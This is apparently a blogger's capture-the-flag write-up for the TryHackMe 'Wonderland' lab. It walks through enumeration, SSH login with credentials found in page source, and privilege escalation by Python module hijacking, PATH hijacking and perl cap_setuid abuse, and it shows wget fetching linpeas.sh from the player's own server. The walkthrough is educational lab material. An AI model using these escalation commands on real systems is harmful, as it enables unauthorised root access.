---
title: TryHackMe - Wonderland - WRITE-UP
date: 2021-02-18 08:46:00 +0100
categories: [TryHackMe, Wonderland]
tags: [privesc, setuid capabilities, medium, $PATH privesc, python-modules-privesc]
lang: en
---
## BOX NAME: [Wonderland](https://tryhackme.com/room/wonderland)

### NMAP
``` $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.31.88 ```
``` bash
$ @
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 10:26 UTC
Nmap scan report for 10.10.31.88
Host is up (0.042s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.25 seconds
```
We see the service is running http server, let's check it:
![index](https://i.imgur.com/83Rv7hH.jpg)  
The main-page gives us a tip to *Follow the White Rabit* and also with "Curiouser and curiouser!" probably  tells us to be... more curious ;p. Let's proceed with enumeration and run Gobuster

### GOBUSTER
``` $ gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.31.88 ```
``` bash
/img (Status: 200)
/index.html (Status: 200)
/r (Status: 200)
/poem (Status: 200)

===============================================================
2021/01/26 10:32:39 Finished
===============================================================
```
### Exploring the Web directories
Many good findings, let's check them all!
#### Checking /img directory
in /img there're the images for the web-app, I ran ```strings``` on them to see if there's anything hidden:  
Nothing interesting in any of them, but I saw something strange in one of it - alice_door.png
```
go:H
-,,,,,,,,,,<Y
&/y0
iWmO
NH>@
z++'5HGw
^{mK#
(wla
~7i;
Lt0zf
w~zt
#3 ?
<i<Fwu
t\_H1w
_<+og
Nd}&Yt
a|XXXXXXXXXXX
 L!8
N/uc8
+^c^}
)#]@
_}2Zf
t ~r^
E[r7e
A/hI
C4])O
yq&f
k@Zq
#cN_`$
|g3f2
'\GWO
U6}!
[Nj<
tI_>
m.zh
aaaaaaaaaaaaa
hFai
^p*|
=8|rH
&q=C
N~fX
i\G;
#~eT
{hWX
/GX;9{aH
OLy8
ZXXXx
302L2
930:
T6'5z2
z>gOz
y23eG
tMWx
QYpT
/,,,,,,,,,,,|i
vT/,,,<f
G       9+8
!y"sd
~l,_XXXXXXXXXXXx
-,,,,<L
5'5,)>s
p;WFN
snNp
zaaaaaaaaaa
```  
There're many lines where the same character is repeated many times. I wonder why is that.  
Let's *continue on web-page directory browsing*. In ```/r/``` we see this page:  
![/r/](https://i.imgur.com/izC02Tm.png)  
"Would you tell me, please, which way I ought to go from here?"  
The keyword **'from here'** catches my attention. Does it refer to **recursive directory bruting?** - Brute-Forcing that would start from ```/r/``` directory and then recursively brute-force new found directories. *Don't know* - let's see other directories.  

In ```/poem``` we see - guess what! - a poem!
![poem](https://i.imgur.com/cq0SsuQ.png)  
I'm non-english speaker, so poem is so enigmatic and so hard to read for me xD.  
This poem seems not important right now...
### Recursive Brute-forcing
Let's try recursive brute-forcing!  ```gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/```  
**We find a directory called** `/a/` - interesting!  
Let's do that again with:  
```gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/a/```  
And again we find a directory called ```b```. Hah, is it then ```/r/a/b/b/i/t/```? Let's go there! ```http://<MACHINE_IP>/r/a/b/b/i/t/```  
![rabbit](https://i.imgur.com/DBLtv8J.png)  
So there're two 'directions' we can take...
1. Where Hatter lives.
1. Where March Hare lives.  
Also, we see in source code a hidden paragraph!
![source-code](https://i.imgur.com/MXMyneN.png)
**'alice:HowDothTheLittleCrocodileImproveHisShiningTail'**  
### Logging as alice with SSH
This might be intepreted as the message, but it's not. Notice that it's in the ```username:password``` format (just like in /etc/passwd). So are these credentials to ssh server?  
``` ssh alice@<MACHINE_IP> ``` and then input the password  

### Privilege Escalations
#### Privilege Escalation to rabbit
We log in! And there we see 2 files:
- ```root.txt``` - For which we do not have any permissions
- ```walrus_and_the_carpenter.py``` - which contains another poem!
```python
And this was odd, because it was
"It’s very rude of him," she said,

The sands were dry as dry.
No birds were flying over head —
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.
To give a hand to each."
Meaning to say he did not choose
To leave the oyster-bed.
And this was odd, because, you know,
And scrambling to the shore.

Conveniently low:

"Before we have our chat;
For some of us are out of breath,
"No hurry!" said the Carpenter.

Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one.""" """

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)

```

Running
```sudo -l```
```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```  
So we can only execute python3.6 and this one script... Which is a poem with imported module ```random```  
When we execute this script with ```python3 walrus_and_the_carpenter.py``` we see it prints random 10 lines of this poem.  

Is there a way we can't escalate privileges then? Yes there is.  
We can create a file in the same directory where the script file is called ```random.py```, this way, instead of importing the actual ```random module``` python interpreter will import the file that we've created, and because the script ```walrus_and_the_carpenter.py``` is owned by root, we may have the possibility of privesc.

Let's create random.py script with contents:
```python
import os

os.system('/bin/bash')
```

And execute the walrus script with

```sudo -u root /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py  ```
```
[sudo] password for alice: <alice_password>
Sorry, user alice is not allowed to execute '/usr/bin/python3.6 walrus_and_the_carpenter.py' as root on wonderland.
```
Okay, so we can't do that as root... Are there any other users in this machine? With ```cat /etc/passwd``` I see that there's also:
- hatter
- rabbit  

Let's first try with hatter...
It didn't work either, but with ```rabbit```

```sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py ```  
It works flawlessly.
#### Privilege Escalation to hatter

Okay so we're user rabbit, but we're still in the same directory as alice. When going to ```/home/rabbit/``` we see there's a SUID binary there!

When executing it:  

```./teaParty  ```
```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 26 Jan 2021 13:16:23 +0000
Ask very nicely, and I will give you some tea while you wait for him
please
Segmentation fault (core dumped)
```  
I'm not proficient with *Buffer Overflows*, but this looks exactly as ones.  
There's always option of copying the file on ssh with ```scp``` command, which I'll use to decompile this binary
```scp alice@10.10.153.28:/tmp/teaParty teaParty```.  

Not so proficient with Reverse Engineering too. Ghidra for instance didn't detect main() function - don't know why.  
Looking at the alternatives I stumbled upon ```Cutter``` - which uses Ghidra decompiler also, but it found the ```main() function```

![decompiled](https://i.imgur.com/5Pjd2ex.png)  
Okay so we see that there's one ```system()``` function that uses the ```date``` command - also without relative paths! So could we do the same thing as before? - With creating our own script with the same name (```date.sh```)? Yes!

But Linux system searches for the script to be executed with environment variable $PATH, let's echo it and see:

```echo $PATH  ```
```
/usr/local/sbin:
/usr/local/bin:
/usr/sbin:
/usr/bin:
/sbin:
/bin:
/snap/bin
```
Let's see if we have write access to any of it. Aaand, we don't! So let's export a directory ```/tmp``` into ```$PATH variable```


```export PATH=/tmp:$PATH``` - This way we place /tmp at the highest priority (before other directories), so the ```date``` script will be
found **before the real date** binary

so with ```vim /tmp/date``` write
```
#!/bin/bash
/bin/bash
```
- The shebang is very important in executing scripts from PATH, especially if we're removing the ```.sh``` extension from the name of the file.

run ```chmod +x /tmp/date``` and then execute again teaParty.
This will automatically login us to hatter user.

Running ```id``` gives us the output ```hatter```
#### Privilege Escalation to root

In his ```/home/hatter``` directory we see ```password.txt```, and there's probably root flag. Probably to root user.  

The thing that is extremely strange to me, is that ```root.txt``` is in the ```/home/alice``` directory. It's like it's reversed.  
### Getting the user flag
executing ```cat /root/user.txt``` will give us the user flag... surprisingly...

With the (I hope) final privesc, let's transfer ```linpeas.sh ``` to the machine

I'll be transfering linpeas.sh script for privesc by:

```python -m http.server 8080``` where you have linpeas.sh located.  
I want to wget get this file to /tmp directory, so I'll cd into that  
```cd /tmp```

```wget http://<YOUR_THM_IP>:8080/linpeas.sh```  
```chmod +x linpeas.sh```  

Before executing, we have to delete ```date``` from the tmp because it pauses the ```linpeas.sh``` scan.

This though is not possible, because it was created by ```rabbit``` user xDD. We might again try logging as the rabbit user, delete this file. But because I have hatter password,  I'll just terminate the machine and deploy it again.

```./linpeas.sh```  
We have many findings:
![linpeas1](https://i.imgur.com/1gUyFiT.png)
**But more importantly:**
![capabilities](https://i.imgur.com/92ndhAE.png)

**What are capabilities?**
>It's a more secure SUID mechanism, where we split all possible privileged kernel calls into groups of related functionality, because of that in an attack scenario the attacker will only gain the assigned subset of capabilities, and not the access of the entire system

>The problem with these capabilities on perl is that... there's empty capability (you see ```+ep```?). An empty capability set means that all the capabilities are enabled and the executable runs as the superuser.

> This combined with cap_setuid capability gives a severe opportunity to escalate this privilege

To use this ```setuid+ep``` capability, we can execute:

```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```  
And with this, we're logged as root. Viewing the flag in /alice/root.txt is now possible

### Final Thoughts
There was so many privilege escalations! And we learnt also about recursive directory bruting, and also decompiled binary to see what it's actually doing!  
We seriously have *entered Wonderland*
